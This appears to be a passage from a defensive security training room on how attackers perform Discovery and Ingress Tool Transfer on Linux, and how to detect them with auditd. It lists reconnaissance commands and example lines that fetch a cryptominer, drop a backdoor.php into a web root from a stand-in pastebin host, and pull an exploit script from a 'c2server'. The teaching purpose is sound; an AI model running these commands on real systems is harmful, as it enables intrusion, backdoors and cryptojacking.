
## Discovery

Imagine suddenly appearing in a Linux system, and all you see is a command-line interface. Your first question would be about where you are and how you appeared there, right? Interestingly, this is how most Linux breaches start for attackers. This is because botnets usually automate the Initial Access, and human attackers join only when an entry point is ready.

## First Actions

The first discovery commands threat actors run on the Linux systems are usually the same, no matter which entry point they used and the goal they pursue. The only exception when Discovery is skipped is when the attackers already know their target or simply want to install a cryptominer and exit, no matter who the victim is. Let's see some basic Discovery examples:

|Discovery Goal|Typical Commands|
|---|---|
|OS and Filesystem Discovery|`pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`|
|User and Groups Discovery|`id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`|
|Process and Network Discovery|`ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`|
|Cloud or Sandbox Discovery|`systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`|
## Detecting Discovery

Detecting Discovery commands is straightforward with auditd or other runtime monitoring tools. First, configure auditd to log the right commands, like those shown in this room. Then, hunt for Discovery using a ==SIEM or ausearch==. But the real challenge is deciding if the commands came from an attacker, a legitimate service, or an IT administrator.

## Ingress Tool Transfer

So, how do the threat actors continue the attack and download malware like cryptominer to their Linux victim? In MITRE terms, how do they perform [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)? There are many ways, but in the vast majority of cases, they utilize one of these three preinstalled commands:

|Command|Usage Example|
|---|---|
|**Wget**: Download a file from the website|`wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz`|
|**Curl**: Make a request to the webpage|`curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"`|
|**SSH**: Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp)|`scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh`|

Like other process creation events, the commands above can be logged with auditd and sometimes appear in Bash history. However, there is a case where process logs aren't helpful. If the victim is reachable over SSH, an attacker can run **scp** or **sftp** from their own system. In this case, you won't see the command on the victim's auditd logs, but you will see a new SSH login!